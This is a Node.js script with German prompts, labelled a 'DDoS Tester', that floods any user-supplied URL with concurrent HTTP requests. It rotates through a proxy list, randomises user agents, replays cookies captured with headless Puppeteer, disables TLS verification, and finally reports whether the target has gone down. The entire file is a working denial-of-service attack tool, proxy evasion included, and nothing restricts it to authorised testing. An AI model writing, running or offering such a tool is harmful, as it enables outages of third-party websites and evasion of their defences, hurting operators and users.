process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const fs = require('fs');
const fetch = require('node-fetch');
const http = require('http');
const https = require('https');
const readline = require('readline');
const chalk = require('chalk');
const HttpsProxyAgent = require('https-proxy-agent');
const puppeteer = require('puppeteer');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

async function getUserInput(query) {
    return new Promise(resolve => rl.question(chalk.blue(query), answer => resolve(answer.trim())));
}

async function validateProxy(proxy) {
    try {
        const agent = new HttpsProxyAgent(proxy);
        const res = await fetch('https://www.google.com', { agent, timeout: 5000 });
        return res.ok;
    } catch (error) {
        return false;
    }
}

async function getValidProxies(proxyList) {
    console.log(chalk.yellow(`📡 Überprüfe ${proxyList.length} Proxys...`));
    const validProxies = [];
    for (const proxy of proxyList) {
        if (await validateProxy(proxy)) {
            console.log(chalk.green(`✔ Proxy gültig: ${proxy}`));
            validProxies.push(proxy);
        } else {
            console.log(chalk.red(`✘ Proxy ungültig: ${proxy}`));
        }
    }
    return validProxies;
}

function loadProxies(filePath) {
    try {
        return fs.readFileSync(filePath, 'utf8')
            .split('\n')
            .map(proxy => proxy.trim().startsWith('http') ? proxy.trim() : `http://${proxy.trim()}`)
            .filter(proxy => proxy.length > 0);
    } catch (err) {
        console.error(chalk.red(`❌ Fehler beim Laden der Proxy-Datei: ${err.message}`));
        process.exit(1);
    }
}

async function getCookies(targetUrl) {
    console.log(chalk.yellow(`🍪 Erfasse Cookies von ${targetUrl}...`));
    const browser = await puppeteer.launch({ headless: true });
    const page = await browser.newPage();
    await page.goto(targetUrl, { waitUntil: 'networkidle2' });
    const cookies = await page.cookies();
    await browser.close();
    return cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
}

async function floodServer(targetUrl, requests, concurrency, useProxies, proxyList, cookies) {
    console.log(chalk.magenta(`🚀 Starte Angriff auf ${targetUrl} mit ${requests} Anfragen und ${concurrency} gleichzeitigen...`));

    const userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
        'Mozilla/5.0 (Linux; Android 10)',
    ];
    let proxyIndex = 0;
    const batchSize = Math.ceil(requests / concurrency);
    const tasks = [];

    for (let i = 0; i < batchSize; i++) {
        const batch = Array.from({ length: concurrency }, async () => {
            try {
                let agent;
                if (useProxies && proxyList.length > 0) {
                    const proxy = proxyList[proxyIndex];
                    agent = new HttpsProxyAgent(proxy);
                    proxyIndex = (proxyIndex + 1) % proxyList.length;
                } else {
                    agent = targetUrl.startsWith('https') ? https.globalAgent : http.globalAgent;
                }

                const options = {
                    agent,
                    headers: {
                        'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
                        'Cookie': cookies,
                        'Referer': targetUrl,
                        'Cache-Control': 'no-cache',
                    }
                };

                const response = await fetch(targetUrl, options);
                console.log(chalk.green(`✔ Erfolgreich gesendet, Status: ${response.status}`));
            } catch (error) {
                console.error(chalk.red(`✘ Fehler: ${error.message}`));
            }
        });
        tasks.push(...batch);

        if (i % 10 === 0) {
            console.log(chalk.cyan(`📦 Batch ${i + 1} gesendet.`));
        }
    }

    await Promise.all(tasks);
    console.log(chalk.green('✅ Alle Anfragen gesendet.'));
}

async function checkWebsiteStatus(targetUrl) {
    try {
        const response = await fetch(targetUrl, { method: 'GET', timeout: 5000 });
        if (response.ok) {
            console.log(chalk.green(`✅ Die Website ${targetUrl} ist noch erreichbar (Status: ${response.status}).`));
        } else {
            console.log(chalk.yellow(`⚠️ Die Website ${targetUrl} könnte down sein (Status: ${response.status}).`));
        }
    } catch (error) {
        console.log(chalk.red(`❌ Die Website ${targetUrl} ist nicht erreichbar.`));
    }
}

async function startAttack() {
    console.clear();
    console.log(chalk.blue('🧑‍💻 DDoS Tester - Starte...'));

    let targetUrl = await getUserInput('🔗 Ziel-URL oder IP-Adresse: ');
    if (!targetUrl.startsWith('http')) {
        targetUrl = `http://${targetUrl}`;
    }

    const numRequests = parseInt(await getUserInput('🔢 Anzahl der Anfragen: '), 10);
    const concurrency = parseInt(await getUserInput('⚙️  Gleichzeitige Anfragen: '), 10);
    const useProxies = (await getUserInput('🌐 Mit Proxy angreifen? (ja/nein): ')).toLowerCase() === 'ja';

    let proxyList = [];
    if (useProxies) {
        const proxyFile = await getUserInput('📄 Proxy-Datei (z.B. proxies.txt): ');
        proxyList = loadProxies(proxyFile);
       
        if (proxyList.length === 0) {
            console.log(chalk.red('❌ Keine gültigen Proxys gefunden. Beende Programm.'));
            process.exit(1);
        }
    }

    console.log(chalk.yellow('📡 Erfasse Cookies...'));
    const cookies = await getCookies(targetUrl);

    rl.close();
    await floodServer(targetUrl, numRequests, concurrency, useProxies, proxyList, cookies);
    await checkWebsiteStatus(targetUrl);
}

startAttack();
